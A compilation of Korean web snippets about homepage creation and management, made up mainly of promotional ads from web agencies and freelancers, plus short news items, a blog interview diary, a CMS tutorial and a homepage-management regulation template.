수 있는 제품인지,괜찮은 기업인지 알아보고 구매나방문을 진행하는 경우가 많아요소비자가 이러한 정보를 접촉할 수 있는 곳은바로 기업의 홈페이지죠 ​홈페이지는 한 번 만들어놨다고 끝나는 것이 아니라지속적인 업데이트로 신뢰감을 심어주고트렌드에 맞춰 새로운 디자인을 추가하고행사나 알림을 팝업창으로 알려주는 등관리를 해주는 것도 굉장히 중요해요 홈페이지는 기업이나 제품에 대한이미지를 좋게 만들고 신뢰를 준다는 사실!그렇기 때문에 지금은 광주홈페이지제작이선택이 아닌 필수가 되었죠​가격적인 부분 때문에 고민이 많으실거에요다양한 업체를 알아보더라도부르는 가격이 천차만별이고또 홈페이지에 대해 일반인들은 알기 어렵기 때문에이 가격이 과연 합리적인가 하는 생각 때문에쉽사리 시작을 못하시더라구요 구조가 얼마나 어렵고 시간이 얼마나 더 드는지그리고 디자인은 얼마나 필요한지에 따라가격변동이 큰 홈페이지제작!저희 마노애드에게 견적을 받아보세요​저희는 최대한 필요한 기능은 살리고기타 불필요한 기능은 최소화 시킴으로써가격적인 부담을 줄여드리고 있어요 홈페이지는 관리자 모드가 쉬워야 한다는 사실!복잡하고 어려워서 사후 관리를 못하여오랫동안 방치되는 경우고 많은데요관리자모드 역시 쉽게 운영할 수 있도록 도와드리고유지 보수 시스템의 전체적인 부분들도보다 체계적으로 관리하실 수 있도록 만들어드리고 있어요 컴퓨터 뿐만 아니라많은 사람들이 모바일로도 접속하기 때문에반응형으로 만드는 것을 추천드리는데요저희 마노애드의 기술력을 통해최상의 웹서비스를 제공해드리고 있으며업체에 맞는 광주홈페이지제작을 진행해드리고 있어요​저희 마노애드에서는이러한 홈페이제작 뿐만 아니라블로그, 카페, 카페 등의 바이럴 마케팅 진행과영상촬영과 영상 편집까지 모두 진행하기 때문에보다 합리적인 가격으로 이 모든 것을편하게 진행해 보실 수 있으실거에요​또한 테크노파크 공급기관이기 때문에더욱 믿고 맡길 수 있죠! 내 기업에 꼭 맞는 homepage가 필요하다면언제든 편하게 문의주시길 바랍니다!​전화번호: 1811-8641​ 대전시설관리공단 홈페이지, '웹 접근성 품질인증' 8년 연속 획득 대전광역시시설관리공단은 대표 홈페이지(www.djsiseol.or.kr)가 과학기술정보통신부가 지정하는 ‘웹 접근성 품질인증’을 8년 연속으로 획득했습니다.‘웹 접근성 품질인증’은 장애인 및 고령자가 웹사이트 이용 시 불편을 느끼지 않도록 웹 접근성 표준지침을 준수하는 우수 홈페이지에 이를 상징하는 품질마크를 부여하는 인증제도입니다.공단은 장애인, 고령자가 보다 편리하게 홈페이지를 이용할 수 있도록 지난 8월 ‘공공시설 이용요금 즉시감면 서비스'를 도입하는 등 개선을 지속적으로 실시한 바 있습니다.특히, 공단은 2012년 웹 접근성 품질인증을 획득한 이래 올해까지 8년 연속으로 인증마크 심사를 통과해 웹 접근성 품질을 유지하고 있습니다.공단 관계자는 “앞으로도 인터넷서비스 이용이 어려운 장애인, 고령자와 같은 정보소외계층을 위해 지속적으로 서비스 개선 노력을 할 것”이라고 밝혔습니다. 안녕하세요~ ㄷㅓ운날씨에 잘들 지내시는지요/애들 두명 키우기 많이 힘드네요ㅋㅋ홈페이지 제작알바를 뛰어야 할거 같아요~~제 직업이 웹프로그래머에요.. 간단히 말씀드리면 홈페이지, 웹사이트 만드는 사람이죠 ㅋㅋㅋ일반 홈페이지, 쇼핑몰 여러종류 가능하지만특히 부동산 홈페이지를 잘(?) 만든답니다.완전 저가형 부동산 홈페이지는 아니고요.고급형에 고객관리프로그램까지 탑제가 가능하답니다. 여러 웹브라우저를 지원하는 표준 홈페이지를 제작합니다.각종 디자인 페이지도 깔끔하게 제작해드립니다.고객관리프로그램은 고객의 여러가지 정보를 관리할수 있고요고객검색,관심,거주지 등 입니다. 영업담당자를 지정할수도 있고 그 담당자만 고객의 연락처를 확인 할수 있는 비밀영업이 가능하답니다.단체문자, 개별문자도 가능합니다.그외에 직원스케줄관리, 근태관리, 카페형게시판 등의 기능이 있습니다.부동산 홈페이지, 고객관리프로그램 문의는이메일 82hanjjang@naver.com휴대폰 ０１０ -  3  0  2  2 - ８３７７댓글로도 받습니다~행복하세요^^ ​​부산홈페이지제작 알아보고 계십니까?조금 알아보신 분들은 아시겠지만, 비용이 만만치 않습니다.​그런데, 또 알아보니 제작비가 정말 천차만별입니다.​적게는 몇십만원에서부터 많게는 천만원을부르는 곳도 있네요. 뜨아아.그리고 무료인 곳도 있어요.가장 많은 견적은 2-3백만원이었습니다.​오늘 저는 무료로 부산홈페이지제작 해드리는 곳을 알려드리려고 합니다.​​ ​​홈페이지 없이 사업을 하기는 정말 어렵습니다.특히나 요즘같은 언택트 시대에는 더욱 그렇죠.​검색창에 '온라인쇼핑 증가' 라는 키워드로검색만 해 보아도 그렇죠.​그리고 요즘은 사람들이 직접 대면보다 비대면,전화문의보다 텍스트 문의를 선호합니다.​젊은 층을 중심으로 식당에서 주문하는 것도직원이 있을 때에도 키오스크를 더 선호합니다.​이른바 언컨택트시대입니다.​PC용 홈페이지 뿐 아니라 모바일용 홈페이지제작도 필수 입니다.모바일 비중이 점점 늘고 있으니까요.​​ ​​홈페이지 제작의 필요성은 공감하지만,문제는 제작입니다.스스로 해결해 보려고 하다가 결국은 전문가를 찾게 되는 경우가 많습니다.개인 홈페이지를 만드는 것과는 수준이 차이가 나죠.​홈페이지 제작 관련 기술도 있어야 하지만,심미적인 감각과 디자인 기술도 필요한데,이것을 다 갖추려면 거의 전문가 수준일 테니 말입니다.​고생하지 말고, 처음부터 전문가에게 맡기시기권합니다.​비용은 무료도 있으니까요.​​ ​​​​부산홈페이지제작 꿀팁! 지금부터 나갑니다!!​​​​ ​ ​​ ​ ​​ ​​​​​​부산홈페이지제작무료상담 바로가기​​​​​ ​​ ​​​ ​ ​​ ​ ​ ​ ​오늘은 이렇게 부산홈페이지제작에 대한 정보를 알려드렸어요.​임대형이 아닌 홈페이지전문가가 만드는 홈페이지관리까지 완벽하게 해주는 홈페이지월관리비로 제작이 무료인 곳​이 정도면 알짜정보 아닙니까?​멋진 홈페이지 만드시기 빌어요.​​​​​ ​ 2020년 5월 15일 금요일 오후 오후 1시 -2시장소 :  강남 테헤란로 빌딩 3층​알바몬에 홈페이지 관리 키워드 광고 시급 9천 원짜리가 떠서 연락해 봤습니다. 포스트 코로나 이후로 비면접 대면이 필요한 시기이고 저는 이제 해외에서 노트북 하나 들고 가서 일하는 걸로 변경하려고 합니다. 그래도 저는 몸 쓰는 일을 좋아합니다. 그 이유가 돈 받고 운동하고 다이어트를 할 수 있어서요. 그리고 항상 머리만 쓰면 심한 두통이 생기는데요 물류 일을 하면 생각이 적어지고 몸은 튼튼해지고 그리고 연장 근무에 따른 배율 일 당비까지 주기 때문에 행복합니다. ​​처음 이 회사 홈페이지 보고 의류 쪽인지 알았는데 부동산이었습니다. 전날 홈페이지 확인해 보니 상권 분석, 자산관리, 상권 MD 이런 걸 다 하는 업체였습니다. 제 느낌은 홈페이지는 허접한데 하고자 하는 사업은 많아서 뭔가 이상하거나 처음 사업을 시작하나 하는 생각이 들었습니다. ​다음 날인 1시 면접 보러 가는 날이었는데요. 혹시나 해서 1시 면접 시간 확인이랑 주소 확인 전화했는데 홈페이지 주소에 나온 곳이 아니라고 하네요. 의심이 또 들기 시작했습니다. 진짜 작은 회사이거나 이상한 회사다.문자로 알려준 주소로 갔습니다. 테헤란로에 위치한 빌딩이었습니다. 아시죠? 테헤란로 빌딩들 다 큰데요 한 층을 다 쓰고 있었습니다. 와 진짜 무슨 회사인가? 갔더니 카운터를 보시는 직원분이  5번 회의실에서 기다리라고 했습니다.  대표님이 직접 들어오시네요 한 시간가량 면접을 진행했습니다. ​사실 제가 면접을 본건 20대 때나 였고 30대부터는 일에 대한 경력이 쌓이면 주로 문제 해결이나 컨설팅 얘기를 주고 하게 됩니다. 즉 사장님 고민 왈 ~~~@#$@#$#@$$@#$@# 저는 컨설팅적인 @$##@$$#@@#$ 이렇게 하시면 풀 수 있어요. ​대표님은 마케팅에 대해서 같이 고민하고 일하시고 싶은 사람을 찾고 싶다고 하시네요. 저는 재택근무 스타일에 너무 많은 일을 원하지 않았고. 제 일 스타일로 했으면 하는 바람입니다. ​키워드 마케팅을 하면 저도 좋지만 랜딩 페이지가 준비가 안 되어 있어서 힘들어 보였습니다. 우선은 홈페이지 지수를 올리는 작업이 필요했습니다 글 수도 20개에서 더 늘려야 합니다. 한 시간가량 제가 작업했던 다른 사이트 예시를 보여 드렸고 대표님은 금액을 물어보셨는데요. 저랑 일을 진행하고 싶어 하는 마음은 있다는 걸 확인했습니다. 그래도 전 금액은 적더라도 꾸준히 일하면서 실질적으로 성과가 나는 걸 체크하고 싶기 때문에 건 바이 건에 콘텐츠 준비 양을 알려 달라고 했습니다. 그리고 그 사이에 다른 면접자도 있기 때문에 생각은 언제든지 변할 수 있죠. ​일단 관리 중점으로 재택, 월 00만 원 정도 생각하고 있습니다. (큰돈 아님... 적은 돈임) 내용은 포트폴리오 페이지 추가 및 검색 최적화키워드 광고 유입을 통한 랜딩 페이지 최적화​고객 전화나 카톡까지 제가 넘겨 주는 게 일이고요. 그다음 대표님 전화를 받으면 매출 뽑아내는 절차입니다. ​여기까지 가 면접 1일차입니다. ​다음 진행이 되면 더 적어 보겠습니다.    ◆5분자유발언- 이은림 의원​​[서울강북신문] 이은림 의원이 22일 도봉구의회 제286회 임시회 제2차 본회의에서 5분발언을 했다.​이 의원은 발언을 통해 “도봉구 시설관리공단 모바일 페이지 전면개편이 필요하다”고 발언했다.​이 의원은 “도봉구민 대다수가 이용을 하는 도봉구시설관리공단 홈페이지가 PC버전만 만들어져 있어, 모바일 버전에서 문화체육시설의 강좌신청 시 수강료 결제를 할 수 없다. 모바일 앱 및 모바일 결제 시스템이 없어 구민의 이용에 불편을 겪고 있다”며 문제점을 지적했다.​이어 “서울시내 25개구 자치구 공단 모바일 페이지 구축현황을 조사한 결과 금천구, 관악구, 노원구에서는 이미 구축되어 구민이 편리하게 이용을 하고 있다. 변화하는 IT시대에 저희 도봉구에서도 도봉구 시설관리공단의 모바일 앱 및 모바일 결제시스템 앱서비스 제공 등을 통해 홈페이지 전면 개편을 해주시길 바란다”고 말했다.​[사진설명]-이은림 의원 ​  메이크홈즈 제대로 준비한 홈페이지제작및관리 정보 플러스홈페이지 제작 업체 선정 정보, 확실히 알아둘수록 활용도가 높아져요!  다른 국가를 여행하는 것은 매번 색다른 즐거움을 안겨주기 마련이에요.지식을 탐구하는 것도 이와 동일한 일! 끊임없이 새로운 지식을 찾아가는 것만큼 만족도 높은 일도 없죠.풍부한 지식의 세계로 데려다 줄 홈페이지제작및관리 핵심 정보, 같이 공부해 볼까요?  몇몇 업체의 경우, 홈페이지 제작을 수주하면 추가 결제 없이 국내의 많은 SNS사이트와연동해 주는 이벤트를 시행하고 있어 홈페이지의 효과를 극대화 하고 있습니다.​  보유한 사람들의 절반 이상이 휴면 계정으로 돌리고 있는데,이것은 홈페이지 관리가 까다롭기 때문입니다. 이를 개선하기 위해 전문 업체와 함께관리에 소홀해지지 않도록 노력하는 것이 좋은 방법입니다.​유지 관리의 경우 시스템 유지보수만을 요청할지, 전체적인사이트의 기술이나 디자인 업데이트에 대한 유지관리만 할지 등에 따라비용이 천지차이입니다.​이미 만들어서 활용하고 있더라도, 일반적인 사용자가 홈페이지를 계속해서관리하고 보완하는 일에는 명백한 한계점이 있습니다.  홈페이지 제작을 계획한다면,일반적인 경우 홈페이지에 대한 전문적인 지식이 부족하기 때문에홈페이지 전문업체를 선택해서, 제작을 위탁하는 것이 현명합니다.​   핵심만 추린 쇼핑몰 홈페이지 제작 연관 정보 바로 알아보기  온라인 마케팅을 진행하고 있는 업체들은 계속 치열해지는 경쟁 상황 가운데,보다 차별화된 마케팅 전략을 펼치기 위해 노력하고 있습니다.​온라인 시장에 도전하기로 마음먹었다면,일단 빠르게 기획해야 하는 부분이 바로 홈페이지를 만드는 것입니다.​쇼핑몰 홈페이지를 제작한다면,브랜드를 중점적으로 소개하여 신뢰도를 높이고쇼핑몰 기능을 통해 판매까지 이어질 수 있도록 제작해야 합니다.​임대 쇼핑몰의 경우 운영하는 데에 필요한 거의 모든 일반 기능들을 제공하기 때문에운영자 입장에선 거의 프로그램에 신경쓰지 않고도 간편하게 제작 가능합니다.  홈페이지는 온라인에서 활동하는 고객들의 시선을 끌어서,매출을 키우는 데에 가장 크게 기여하는 핵심 요소입니다.​  우리 업체를 더 쉽게, 더 대대적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 퀄리티의 로고와 홈페이지를 제작해주는 메이크홈즈가 도와 드릴게요!  업체의 상품과 서비스를 철저히 분석해 더 보기 쉽게, 더 흥미가 일도록 만들어드리는 곳!인스타그램 등 SNS를 이용한 다양한 광고마케팅도 병행하여 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 부담 없는 견적으로 고객님의 마케팅 비용은 낮춰주고!신속정확한 일처리 및 지속적인 피드백으로 홈페이지 제작 및 만족도는 높여주고!​지금 즉시 메이크홈즈에 전화해 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!문의 전화번호 052-267-2027/ 010-3063-7993눈동자를 반짝이는 열정을 가진 사람을 볼 때면 우리 기분까지 좋아지곤 하는데요.홈페이지제작및관리 연관 핵심 정보를 학습한 여러분의 눈도 그만큼 반짝였을 거예요.희망찬 미래의 문을 열 수 있도록 더 흥미로운 주제만 데려올 테니 지켜봐주세요!  ​ 개인의 홈페이지가 만들어지고 영업과 업무에 필수불가결하게 인터넷이 활용되는 시대다. 더구나 행정기관의 홈페이지는 기관의 얼굴이고 그 내용으로 기관의 행정역랑을 가늠할 수 있다고 한다. 최근 시군구 홈페이지를 여러곳 방문해 보았다. 그리고 각 기관마다 옥이 있고 옥의 티가 보이기에 여기에 소개하고자 한다. 담양군청 홈페이지 주소는 "대한민국 전라남도 담양군"으로 표기하고 있다. 우리가 국내에서 우편물이나 택배 주소를 쓸때 '대한민국'을 쓰는 경우가 거의 없었는데 그 의미가 신선하게 마음속에 다가왔다. 새로 정비된 6자리 우편번호가 주소 왼쪽에 있는 것이 일반적이어서 익숙한데 담양군, 장흥군, 순천시는 주소 오른쪽에 우편번호를 적었다. 특이하게도 칠곡군 홈페이지의 주소는 카피가 안된다. 복사를 할 수 없어서 조금 불편했다. 어느 홈페이지에서는 주소복사 아이콘을 제공해 주어서 참으로 고마웠다.초기화면을 시군구의 홍보의 장으로 쓰는 것이야 당연한 일이고 거의 대부분의 시군구 홈페이지에는 기관장의 사진과 인사말이 보인다. 그런데, 경남 함양군청 홈페이지에는 '남계서원'을 크게 홍보하고 있다. 문화재청 홈페이지에서 서원에 대해 상세히 설명을 들었다. 조선 시대 교육기관인 「한국의 서원」이 2019년 7월6일에 유네스코 세계유산에 등재하기로 최종 결정했다고 설명한다. 우리나라는 조선왕릉 등 14개소의 세계유산을 보유하게 되었다. 「한국의 서원」은 소수서원(경북 영주), 도산서원(경북 안동), 병산서원(경북 안동), 옥산서원(경북 경주), 도동서원(대구 달성), 남계서원(경남 함양), 필암서원(전남 장성), 무성서원(전북 정읍), 돈암서원(충남 논산) 등 총 9개로 구성된 연속유산으로, 모두 국가지정문화재 사적으로 지정되어 있다고 소개되었다. 이같은 자치단체 홈페이를 통한 홍보 사례는 '강건너 불'이 아니라 '타산지석'이라 할 것이다. 다른 기관의 장점을 살리고 단점을 참고해서 우리의 것을 보완하는 노력이 필요하다. 더구나 홈페이지는 국내외에서 많은 분들이 들어오므로 시군청 공무원 모두가 관리책임자가 되어 늘 새로운 자료로 업데이트하여야 한다. 한밤중에도 소리없는 방문이 이어지고 있기 때문이다. 틀린 자료, 기간이 경과한 데이터가 뻘쭘하게 남아있는 홈페이지를 만나면 그 기관 전체에 대한 이미지가 크게 손상될 것이다. 늘 화장하고 분장하는 꾸미는 마음으로 우리 기관의 홈페이지도 화장하듯 관리를 받아야 한다는 생각이 들었다. 안녕하세요.부동산에 기술을 더하는 사람들부미녀 입니다!​직원이 퇴사했어요 본인의 자유를 찾아..떠났습니다그 또는 그녀는 매물만 남겨두고떠났는데..​직원 삭제는 해야겠고퇴사한 직원이 올린매물은어떻게 되는건가요..그 or 그녀의 연락처는매물 곳곳에 남아있는데​어느세월에 다 수정하느냐고요할일이 너무 많은데 언제 그걸 또 다하고 있어​눈에서 땀이 납니다.​그렇지만 부기사는!그런 고민 싹 없애드리죠!​ 관리자/직원관리 삭제할 직원을 선택하여삭제를 눌러주세요!​ 네..영원히 삭제해드림..잘가시오​ 하지만 영구 삭제 될때까지삭제된게 아닙니다.​삭제된 관리자/직원 클릭!​ 갈땐 가더라도매물은 내놓고가세요.​삭제된 관리자/직원 란에조금전 삭제한 직원이 있는것을 확인 할 수 있습니다.​복구 또는 삭제를 하실 수 있는데요​삭제를 클릭하시면!​ 삭제시 매물 이전 할 직원/관리자를 선택 하실 수 있습니다.​선택하시면 선택하신 관리자 또는 직원에게모든 매물이 이관되며 매물상세페이지에연락처 및 정보가 변경됩니다.​일일히 하지않으셔도 한번에 해결가능합니다!​​#부동산홈페이지제작 상담 문의는 오픈카톡 https://open.kakao.com/o/s9OyyLJc 부기사 오픈상담톡open.kakao.com ​​또는 아래 연락처로 연락주세요070-8064-8054​더 많은 정보가 궁금하시다면 부기사 홈페이지를 방문해주세요.https://bugisa.com 부기사 - 부동산에 기술을 더하는 사람들지도기반 부동산 홈페이지 제작, 3D VR 촬영, 부동산 매물관리, 부동산 홍보, 해외부동산 중개는 부기사bugisa.com ​ 안녕하세요!굿바이 2019를 외친지 얼마되지 않은 것 같은데 벌써 2020년 설날이네요!오늘 내일만 더 힘차게 달리면 이제부터 설 연휴이니 모두들 화이팅입니다.새해 복 많이 받으세요~!오늘은 제가 여름방학에 웹디자인을 공부했던 대구웹디자인학원 에 대해 포스팅해보려고 합니다!​​요즘 스마트폰이 없는 생활은 상상할 수 없을 정도로 우리와 밀접하게 연관이 되어 있는데요.그래서 자연스레 웹디자인에 대해서도 사람들의 관심도 커진 것 같습니다.저 또한 이러한 시대적 흐름으로 웹디자인을 알아보기 위해 찾아보다가가장 많은 후기를 가지고 있는 대구웹디자인학원 을 알게 됐습니다.​​사실 저도 웹디자인에 대해서 정확히는 잘 모르고 있었습니다.'단순히 홈페이지를 디자인하는 것이겠지?' 또는 '그냥 홈페이지 만드는 그런 건가?'라는 막연한 생각들을 했습니다.홈페이지를 제작과 관리가 가능하게 된다면 많은 일을 할 수 있겠다는 생각으로 학원을 찾아가 상담을 받았습니다.물론 취업을 준비하면서 관련 자격증이나 활용 가능자를 우대사항으로 많이 보기도 했답니다.​​저는 대구웹디자인학원 에 방문하여 상담을 받으면서 웹디자인에 대해서 좀 더 상세히 듣게 되었습니다.제가 앞서 했던 생각들은 다른 사람도 흔히 하는 착각이었다는 걸 깨닫는 건 그리 오래걸리지 않았었는데요.웹디자인은 디자인뿐만 아니라 웹코딩도 활용이 필요했는데 물론 프로그래밍, 개발자의 수준까지는 아니지만홈페이지에 레이아웃을 잡고 웹 모션을 추가하는 등 퍼블리싱을 하는 작업 위해서 꼭 필요했었습니다.웹코딩 공부까지 해야 한다는 생각에 걱정이 좀 되긴 했었지만이왕 마음먹고 시작하기로 했으면 기초부터 탄탄히 다져서 결과를 만들어야지 않겠냐는 생각으로 공부를 시작했었습니다.​상담을 도와주셨던 분은 저의 수준에 맞는 커리큘럼을 소개해주셨습니다.결론만 말씀드리면 저는 완전 생초짜였기 때문에 기초부터 차근차근 공부를 할 수 있도록 안내를 받았었는데요.먼저 기초적인 디자인 소양을 키우기 위해 포토샵과 일러스트 기초반을 통해 프로그램과 더 친해져야 했습니다.또 이어서 인디자인 프로그램을 배우게 되었는데 인디자인 프로그램이 실제로 편집디자인 분야에서도 많이 사용하는프로그램이었고 또 인쇄물 작업을 위해서 빠질 수 없는 과정인 것을 알게 되었습니다.책을 출판하거나 잡지를 만드는 등의 일에도 인디자인 프로그램이 사용될 수 있었습니다.물론 웹디자인 분야에서 크게 비중을 차지하는 툴은 아니지만웹디자인을 배우더라도 '내가 웹디자이너로 취업을 하겠다'는 아니였어서 다양한 방향을 열어두기 위해 같이 공부를 했었습니다.또한 컴퓨터그래픽스운용기능사라는 국가공인 자격증을 취득하기 위해서 필요한 과정이였습니다.​​드디어 웹으로 들어가면서 먼저 HTML에서부터 시작해서 기초부터 CSS 등 하나씩 배우게 되었습니다.웹의 역사는 생각보다 길지 않지만 그간 일어난 많은 변화로 인해 현재는 단순히 인터넷 웹사이트라는 개념을공부한다기보다는 스마트폰이나 아이폰 등의 웹 환경을 이해하는 것이 굉장히 중요하다는 것을 생각했고시대에 발맞춰 자바 스크립트와 제이쿼리까지도 공부를 했었습니다.​​본격적으로 UIUX 디자인을 배우면서 웹 환경의 중요성이 왜 그렇게 강조됐는지 알 수 있었고웹을 디자인하는 사람이 정말 많은 것을 고려하고 디자인해야 한다는 것을 더 잘 알 수 있었습니다.무엇보다도 처음 포토샵 수업을 들을 때는 잘 몰랐지만 그러한 기초적인 소양을 쌓는 작업이 정말 중요하다는 것이 뒤늦게 느껴졌습니다.제가 공부했었던 대구웹디자인학원 의 커리큘럼이 굉장히 촘촘하고 체계적이라는 생각을 다시금했던 계기가 됐었는데요.​​여러분들 중에서도 분명 웹디자인을 배우기 위해 여러 방법들을 찾고 계시는 분들이 계실 거라고 생각합니다.그런 분들에게 저는 대구웹디자인학원 을 강력하게 추천해드리고 싶네요! 단순히 배우고 끝나는 게 아니라왜 배워야 하는지부터 시작해서 배운 것을 응용하여 자기만의 작품을 완성할 수 있도록 이끌어주는 곳이랍니다!아래에 배너를 남겨놓으니 관심이 있으신 분들은 꼭 문의를 받아보시기를 추천해드립니다! 대부분 사람들이 생각하는 홈페이지완성은 차별화된 디자인과 브랜드가치를 잘 전달할 수 있는 컨텐츠 구성입니다. 그러나 겉으로 보여지는 부분도 중요하지만 효율적인 홈페이지관리를 위한 관리자모드의 기능도 중요합니다.  간편한 관리자모드를 사용할 수있을 때 비로소 홈페이지는 완성됩니다.​관리자모드란 일반 홈페이지방문자들은 볼수 없고 해당사이트관련 담당자만이 로그인을 통하여 어떠한 작업을 실행할 수있는 시스템입니다.​예를 들면 회사 내의 소식를 전달할수 있는 공지사항 같이 다른 사람들은 작성할수 없고 관리자만이 작성할수 있게 게시판도 관리자페이지가 존재합니다.​관리자모드는 홈페이지관리하는데 유용하기 때문에 관리비용을 아낄 수 있습니다​.특히 공지사항, 커뮤니티 등 공통적인 게시판은 관리자페이지로 작성 및 수정 삭제가 가능하기 때문에 업체의 도움없이 관련 게시물들을 직접 관리하여 효과적인 홈페이지운영이 가능합니다.​그렇기 때문에 웹사이트제작 할 때는 홈페이지관리도 고려하여 다양한 업종의 성격에 맞게 맞춤형으로 관리자페이지를 제작합니다.  그렇다면 어떠한 경우에 해당하는지 디자인펀치가 제작한 사례를 살펴보겠습니다. 홈페이지관리비용을 아낄수 있는 관리자모드 페이지제작1. 실적리스트 보여주기디자인펀치가 제작한 건설회사홈페이지일반적인 사진과 제목, 내용만을 관리할수 있을 뿐아니라 건설회사의 성격에 맞게 공사기간, 규모, 총세대수, 형태를 관련 담당자가 관리자모드를 통해 작성, 수정, 삭제할수 있도록 제작했습니다. 단순히 리스트만 노출하여 홈페이지방문자들에게는 일반적인 페이지처럼 보여주는 효과를 연출합니다. 관리자페이지없이 이러한 목록을 하나씩 추가할때마다 업체에게 의뢰한다면 비용이 더 발생하는 상황에 마주합니다.​ 2.포트폴리오 보여주기디자인펀치가 제작한 대학교포트폴리오 홈페이지 카테고리별로 각 포트폴리오 리스트를 대학교성격에 맞게 보여질수 있도록 제작했습니다. 썸네일사진, 학번, 학생이름, 영상재생시간 까지 관리자가 직접 설정할수 있습니다. 디테일한 내용에서도 유튜브영상, 해당 포트폴리오내용설명, 참여학생이름까지 관리자모드 페이지를 통하여 직접 관리할수 있어 효과적인 포트폴리오 운영이 가능합니다. 유튜브영상은 링크를 통해 손쉽게 관리가 가능합니다.​ 3.제품 자세히 보여주기디자인펀치가 제작한 회사홈페이지 쇼핑몰사이트가 아닌데도 쇼핑몰형태인 것처럼 디자인하여 담당자가 직접 관리자모드 페이지를 통해 회사의 여러제품들을 업로드하고 수정할수 있도록 제작했습니다. 제품의 사진과 제목 뿐만 아니라 관련 사진들과 정보들도 직접 수정할수 있습니다. 관리자모드가 없다면 제품들이 새로 생길 때마다 일일이 코딩을 해야하는 상황을 마주할수 있기 때문에 비용이 발생합니다.  이렇게 디자인펀치는 다양한 형태의 디자인으로 관리자가 정보를 직접 작성하고 수정하고 삭제할수 있도록 관리자페이지를 제작했습니다.각 상황에 맞는 정보들을 보여주는데 관리자페이지는 굉장히 유용하며 홈페이지관리비용을 절감할 수 있습니다.​웹사이트에 원하는 관리기능이 있다면 업체와 충분한 의사소통으로 맞춤형 관리자모드페이지를 보시길 바라겠습니다. 홈페이지관리를 어디에 맡기고 계신가요?홈페이지를 만들고 홈페이지관리가 중요해지고 있는 요즘.      어디서부터 알아봐야하는지 정말 헷길리시지요?정보들이 너무너무 많아서 사람들은 제대로 홈페이지관리하는 업체들을 찾는데 쉽지가 않습니다.     그리고 처음 상담할 때와는 다르게 계속 계속 올라가는 홈페이지관리 비용!어디까지 알아보고 상담해야할까요?홈페이지관리는 정확한 비용과 비용에 맞는 퀄리티가 제공이 되야하는데 그런 곳을 제대로 만나기는 쉽지 않습니다.     아 이번에는 제대로 홈페이지관리 업체를 찾았다고 해도 막상 상담해보면수정이나 기타비용이 너무 많구요. ㅠ_ㅠ     정말 확실한 곳을 소개해드립니다!!!홈페이지관리 전문기업! 비즈메카!     고객의 말에 귀를 기울이는 홈페이지관리 전문가!홈페이지관리로 걱정하시는 모든 분을 위해비즈메카에서 모두모아플랜99가 나왔습니다.     홈페이지관리 PC홈페이지는 물론, 모바일홈페이지, 키워드를 통한 마케팅,튼튼사후관리까지 패키지로 진행하고 있습니다.     다른 홈페이지관리업체랑 비슷한 곳아니냐구요?절대 절대 아닙니다!홈페이지관리 비즈메카의의 모두모아플랜99는 패키지로 가격 부담없이 서비스를 받아보실 수 있습니다^^     위 이미지 클릭하시면 더 많은 도움되실꺼에요 이제 홈페이지관리는 전문가에게 맡기세요!!비즈메카!!   간단한 홈페이지 이미지 수정/제작/관리바람도 많이 불었던 주말이었네요. 주말에도 급하게 간단한 이미지 제작이나 배너 디자인이 급하신분들이 많으셨네요.간단한 이미지 제작 수정은 바로 바로 수정해서 업로드 해드립니다.설치형 보드가 삽입되어진 페이지들을 수정하셔야 하는 분들도 있으시고배너제작을 원하시는 분들도 계셨고 이미지 텍스트 수정도 원하시는 분들도 계셨고주말에 연락들이 많았네요. 급하게 홈페이지형 블로그 스킨 제작을 원하시는분도 계시고~다들 비용을 가장먼저 물어보시네요~5.000원부터 50,000원까지 비용은 저렴합니다. 아래 이메일로 의뢰주시면 간단한 것들은 바로 제작해 드립니다.그리고 월단위로 홈페이지 관리, 유지보수 원하시는 업체는업무량에 따라서  100,000에서 1,000,000원까지~~요즘 회사마다 홈페이지나 쇼핑몰을 운영하는 업체가 대다수라웹디자이너분들이 한분씩 계시죠?  홈페이지 관리도 해야하고 쇼핑몰 신제품도 업데이트도 해야하고.그런데 급하실때 디자이너가 상주근무하지 않으실때간단한 홈페이지 이미지 수정이나 네이버블로그 네이버카페에 들어가는 이미지 제작에고생을 하시죠. 블로그 스킨 제작부터 간단한 이미지 제작 수정까지 저렴한 비용으로 제작해 드립니다.sjdj11@naver.com 010-9445-0702 홈페이지 관리규정회사에서 홈페이지를 구축하고 효율적으로 운영, 유지 보수함으로써 홈페이지 방문자들에게 다양한 정보를 제공하고 회사의 사업내용을 홍보하기 위함을 목적으로 하는 내용의 홈페이지관리규정 자료입니다.<출처 : 홈페이지 관리규정> 제 1 조 【 목 적 】제 2 조 【 관리대상 】제 3 조 【 관리범위 】제 4 조 【 위원회 】제 5 조 【 홈페이지 전담관리팀 구성 】제 6 조 【 회 의 】제 7 조 【 업무처리절차 】제 8 조 【 기 타 】제 1 조【 목 적 】이 규정은 ○○주식회사(이하 회사라고 한다)의 홈페이지를 구축하고 효율적으로 운영, 유지 보수함으로써 홈페이지 방문자들에게 다양한 정보를 제공하고 회사의 사업내용을 홍보하기 위함을 목적으로 한다.제 2 조【 관리대상 】1.회사 도메인(domain)내에서 회사를 대표하는 홈페이지에 대한 관리를 원칙으로 한다.2.본 홈페이지와 연결되는 회사 홈페이지에 대해서는 통일된 회사 기준을 제시하여 자발적인 참여를 유도한다.제 3 조【 관리범위 】1.본 홈페이지에서 관리하는 정보내용은 다음과 같다.1) 회사홍보 관련 사항2) 회사의 각종 행사 안내 및 공지사항3) 각종 규정4) 사내 구성원 정보5) 생산제품, 기술 및 서비스정보<출처 : 홈페이지 관리규정>​   ​​​현대사회에서는 서비스나 제품을 이용하기 위해서남녀노소 모두 인터넷 검색을 이용하고 있습니다.​특히 스마트폰의 보급이 보편화되면서,인터넷을 일상 속에서 사용하지 못한다면생활에 여러가지 지장이 갈 정도로우리의 삶 속에 깊이 들어와 있는 것이 바로인터넷이 아닐까 생각이 드는데요.​다른 나라들에 비해서 대한민국의독보적으로 빠른 인터넷 속도와최고 수준을 자랑하는 전자기기 보급율은오프라인의 서비스, 제품들과 온라인 세상은 떼놓을 수 없는 관계가 되었습니다.​​​   ​​​그래서 많은 사람들은 자신이 원하는서비스를 이용하거나 제품을 구매하기 전에미리 온라인을 통해서 사전 정보를 검색합니다.과거, 정보화가 이루어지지 않았던 시대에는자신이 원하는 정보를 얻기 위해서직접 매장을 방문하거나, 전화 상담을 이용했습니다.​하지만 인터넷이 발달하며 직접 매장을찾거나 전화로 직원과 대화를 나누지 